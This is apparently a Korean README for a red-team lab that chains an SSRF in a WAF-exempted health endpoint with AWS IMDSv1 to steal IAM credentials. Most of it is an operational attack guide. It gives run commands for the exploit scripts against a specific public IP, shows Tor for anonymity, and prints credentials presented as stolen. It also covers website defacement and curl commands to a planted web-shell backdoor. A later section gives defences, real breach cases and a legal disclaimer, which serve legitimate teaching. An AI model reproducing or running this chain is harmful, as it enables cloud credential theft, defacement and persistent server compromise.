# AWS IMDSv1 공격 시나리오 - 완벽한 보안의 작은 틈

## 🎯 시나리오 개요

**"Perfect Security + One Small Gap = Total Compromise"**

이 프로젝트는 완벽해 보이는 보안 시스템에서 **단 하나의 작은 설정 실수**가 어떻게 전체 시스템 장악으로 이어지는지 보여주는 Red Team 시나리오입니다.

### 보안 시스템
- ✅ **ModSecurity WAF** (OWASP CRS) - 모든 공격 차단
- ✅ **Splunk SIEM** - 실시간 로그 모니터링
- ✅ **PHP disable_functions** - 위험한 함수 모두 차단
- ✅ **파일 업로드 필터** - 웹쉘 업로드 차단
- ✅ **방화벽 + Security Group** - 네트워크 보안

### 작은 틈 (개발자의 실수)
- ❌ **health check 엔드포인트** (`/api/health.php`) 를 ModSecurity 예외로 설정
  - 이유: 로드 밸런서 health check가 WAF에 막혀서 예외 처리
  - 결과: **SSRF 취약점 발생**

- ❌ **AWS IMDSv1 활성화**
  - 이유: 레거시 애플리케이션 호환성 (IMDSv2 강제 미적용)
  - 결과: **내부 AWS 자격 증명 유출 가능**

---

## 📂 파일 구조

```
exploits/
├── 119_setup_aws_vuln.sh          # [Stage 1] 서버 취약점 설정
├── 120_aws_imds_exploit.py        # [Stage 2] IMDS 공격 및 자격 증명 탈취
├── 121_aws_privilege_escalation.py # [Stage 2+] AWS 권한 확인
├── 122_aws_ssm_command.py         # [Stage 3] AWS SSM 원격 명령 실행
├── 123_root_takeover.py           # [Stage 4] 루트 권한 탈취 자동화
├── 124_execute_deface.sh          # [Stage 4] 웹사이트 변조 실행 스크립트
├── defacewebsite.sh               # [Stage 4] 웹사이트 변조 스크립트 (서버 실행용)
├── backdoor.php                   # [Stage 4] 백도어 PHP (옵션)
├── health.php                     # [Stage 1] SSRF 취약점 엔드포인트 (서버 업로드용)
├── EXECUTE_STEPS.md               # 실행 가이드
├── STAGE_1_CREATE_VULNERABILITY.md # 취약점 생성 가이드
└── README.md                      # 이 파일
```

---

## 🚀 전체 공격 체인

```
[개발자의 실수]
    ↓
/api/health.php 발견 (포트 스캔/디렉터리 브루트포스)
    ↓
ModSecurity 예외 → WAF 우회
    ↓
?check=metadata 파라미터 → SSRF 트리거
    ↓
http://169.254.169.254/latest/meta-data/ 접근
    ↓
IMDSv1 → IAM 자격 증명 탈취
  • AccessKeyId
  • SecretAccessKey
  • SessionToken
    ↓
AWS 권한 획득 (EC2-SSM-Role)
    ↓
EC2 Instance Connect / SSM / 기타 AWS 서비스 접근
    ↓
서버 접근 권한 획득
    ↓
defacewebsite.sh 실행 → 웹사이트 변조
    ↓
백도어 설치 (.system.php)
    ↓
✅ 서버 완전 장악
```

---

## 💻 실행 방법

### Stage 1: 서버에 취약점 생성 (AWS EC2에서 실행)

```bash
# 서버에 SSH 접속
ssh ec2-user@52.79.240.83

# 취약점 설정 스크립트 다운로드
wget https://raw.githubusercontent.com/.../119_setup_aws_vuln.sh
# 또는 scp로 전송

# 실행 (루트 권한 필요)
sudo bash 119_setup_aws_vuln.sh
```

**이 스크립트가 하는 일:**
1. IMDSv1 활성화 (AWS Console에서도 가능)
2. `/api/health.php` 엔드포인트 생성 (SSRF 취약점)
3. ModSecurity 예외 설정
4. Apache 재시작

### Stage 2: 로컬에서 AWS 자격 증명 탈취

```bash
# Tor 실행 (익명화)
brew install tor  # macOS
tor &

# IMDS 공격 스크립트 실행
python3 120_aws_imds_exploit.py 52.79.240.83
```

**결과:**
- `aws_stolen_<timestamp>.sh` - AWS CLI 설정 파일
- `aws_stolen_<timestamp>.json` - JSON 형식 자격 증명

**획득한 정보:**
```
AccessKeyId:     ASIASO4TYV4OK2MJVZDV
SecretAccessKey: 7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE
Token:           IQoJb3JpZ2luX2VjEM...
Role:            EC2-SSM-Role
```

### Stage 3: AWS 권한 확인

```bash
# 자격 증명 설정
source aws_stolen_<timestamp>.sh

# 또는
export AWS_ACCESS_KEY_ID="ASIASO4TYV4OK2MJVZDV"
export AWS_SECRET_ACCESS_KEY="7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEM..."

# 신원 확인
aws sts get-caller-identity --region ap-northeast-2

# 권한 테스트
python3 121_aws_privilege_escalation.py
```

### Stage 4: 웹사이트 변조 및 서버 장악

#### 방법 A: 자동화 스크립트 (가장 간단)

```bash
# AWS 자격 증명 설정
source aws_stolen_<timestamp>.sh

# 자동 실행
bash 124_execute_deface.sh
```

#### 방법 B: 서버에 직접 접속

```bash
# defacewebsite.sh 업로드
scp defacewebsite.sh ec2-user@52.79.240.83:/tmp/

# 서버 접속
ssh ec2-user@52.79.240.83

# 실행 (루트 권한)
sudo bash /tmp/defacewebsite.sh
```

#### 방법 C: Python 자동화

```bash
python3 123_root_takeover.py 52.79.240.83
```

---

## 🎯 공격 성공 증거

### 1. 변조된 웹사이트
브라우저로 접속: `http://52.79.240.83/www/`

**확인 사항:**
- "SYSTEM COMPROMISED" 큰 제목
- Matrix rain effect (녹색 문자 떨어지는 애니메이션)
- 공격 체인 설명 표시
- 서버 정보 표시 (호스트명, 타임스탬프)

### 2. 백도어 웹쉘
```bash
curl "http://52.79.240.83/www/.system.php?cmd=whoami"
# 출력: apache

curl "http://52.79.240.83/www/.system.php?cmd=id"
# 출력: uid=48(apache) gid=48(apache) groups=48(apache)

curl "http://52.79.240.83/www/.system.php?cmd=hostname"
# 출력: ip-172-31-x-x.ap-northeast-2.compute.internal
```

### 3. 루트 권한 증거 (서버 내부)
```bash
# SSH 접속 후
ssh ec2-user@52.79.240.83

# 변조된 파일 확인
ls -la /var/www/html/www/index.php*
# index.php        - 변조된 파일
# index.php.original - 원본 백업

# 백도어 확인
ls -la /var/www/html/www/.system.php
# -rw-r--r-- 1 apache apache 120 Nov 16 12:34 .system.php

# sudo 권한 확인
sudo -l
# User ec2-user may run the following commands:
#     (ALL) NOPASSWD: ALL

# 루트 권한으로 명령 실행
sudo whoami
# root
```

### 4. 공격 로그 (Apache access log)
```bash
sudo tail -100 /var/log/httpd/access_log | grep health.php
```

**확인 사항:**
- `/api/health.php?check=metadata&url=http://169.254.169.254/...` 요청들
- 여러 IMDS 경로 요청 흔적
- Tor 프록시를 통한 익명 IP 주소

---

## 📊 공격 시나리오 분석

### 왜 이 공격이 성공했는가?

1. **ModSecurity 예외 설정 실수**
   - health check를 위해 `/api/health.php`를 WAF 예외로 등록
   - 하지만 이 엔드포인트에 SSRF 취약점이 있었음
   - **교훈**: 예외 처리는 최소한으로, 코드 리뷰 필수

2. **IMDSv1 활성화 (레거시 지원)**
   - IMDSv2는 토큰 기반 인증 필요 (SSRF 방어)
   - IMDSv1은 단순 HTTP GET 요청으로 접근 가능
   - **교훈**: IMDSv2 강제 사용 (`HttpTokens=required`)

3. **PHP disable_functions 우회**
   - `system()`, `exec()`, `shell_exec()` 등은 차단됨
   - 하지만 `file_get_contents()`는 허용됨
   - **교훈**: SSRF 방어는 함수 차단만으로 부족, URL 필터링 필요

4. **Defense in Depth의 실패**
   - 다층 보안이 있었지만, 한 층이 뚫리자 연쇄 붕괴
   - **교훈**: 각 계층이 독립적으로 강력해야 함

---

## 🛡️ 방어 방법

### 즉시 적용 (Critical)

1. **IMDSv2 강제 사용**
   ```bash
   aws ec2 modify-instance-metadata-options \
       --instance-id i-xxxxxxxxx \
       --http-tokens required \
       --region ap-northeast-2
   ```

2. **ModSecurity 예외 제거 또는 제한**
   ```apache
   # /etc/httpd/conf.d/modsecurity.conf
   <LocationMatch "/api/health\.php">
       # SecRuleEngine Off  ← 제거!

       # 대신 특정 규칙만 비활성화
       SecRuleRemoveById 950109  # 예: 특정 false positive만
   </LocationMatch>
   ```

3. **SSRF 방어 추가**
   ```php
   // health.php
   $url = $_GET['url'];

   // IP 주소 필터링
   $parsed = parse_url($url);
   $ip = gethostbyname($parsed['host']);

   // 169.254.169.254 차단
   if (preg_match('/^169\.254\./', $ip) ||
       preg_match('/^127\./', $ip) ||
       preg_match('/^10\./', $ip)) {
       die('Access denied');
   }
   ```

### 중기 개선 (High Priority)

4. **WAF 예외 최소화**
   - Health check 엔드포인트는 정적 응답만
   - 파라미터 받지 않기

5. **네트워크 레벨 차단**
   ```bash
   # iptables로 169.254.169.254 차단 (애플리케이션 레벨에서만)
   iptables -A OUTPUT -d 169.254.169.254 -m owner --uid-owner apache -j REJECT
   ```

6. **Splunk 알림 강화**
   - `169.254.169.254` 접근 시 즉시 알림
   - `health.php`에 `metadata` 파라미터 조합 시 알림

### 장기 개선 (Medium Priority)

7. **IAM Role 최소 권한 원칙**
   - EC2-SSM-Role의 권한 최소화
   - 필요한 권한만 부여

8. **정기 보안 감사**
   - ModSecurity 예외 목록 리뷰
   - IMDSv1 사용 인스턴스 스캔
   - SSRF 취약점 코드 리뷰

---

## 📚 참고 자료

### Real-World 사례

1. **Capital One 해킹 (2019)**
   - SSRF → IMDS → AWS 자격 증명 탈취
   - 1억 명 이상의 고객 데이터 유출
   - [참고](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)

2. **Tesla 쿠버네티스 해킹 (2018)**
   - 무방비 쿠버네티스 대시보드 → AWS 자격 증명
   - 암호화폐 채굴에 악용

3. **Uber 데이터 유출 (2016)**
   - GitHub에 노출된 AWS 키
   - 5천 7백만 사용자 정보 유출

### 문서

- [AWS IMDS v2 가이드](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [OWASP SSRF 방어](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [ModSecurity CRS](https://coreruleset.org/)

---

## ⚠️ 법적 고지

이 프로젝트는 **교육 및 연구 목적**으로만 사용되어야 합니다.

- ✅ 허용: 자신이 소유하거나 명시적 허가를 받은 시스템
- ✅ 허용: 법적으로 승인된 모의 침투 테스트
- ✅ 허용: CTF 경진대회, 보안 교육 환경
- ❌ 금지: 무단 접근, 불법 시스템 침투
- ❌ 금지: 데이터 유출, 서비스 방해

**무단 사용 시 법적 책임은 사용자에게 있습니다.**

---

## 👥 Credits

- **Scenario Design**: Red Team Security Research
- **Target Environment**: AWS EC2 (Amazon Linux 2)
- **Tools Used**: Python 3, Bash, Tor, AWS CLI
- **Purpose**: Security Education & Awareness

---

## 📞 Contact

보안 취약점 발견 또는 질문이 있으시면:
- 이메일: security@example.com
- GitHub Issues: https://github.com/.../issues

---

**Remember**: "Perfect security is a myth. Defense in depth is the reality."

모든 보안 시스템은 완벽할 수 없습니다. 여러 계층의 독립적이고 강력한 보안이 필요합니다.
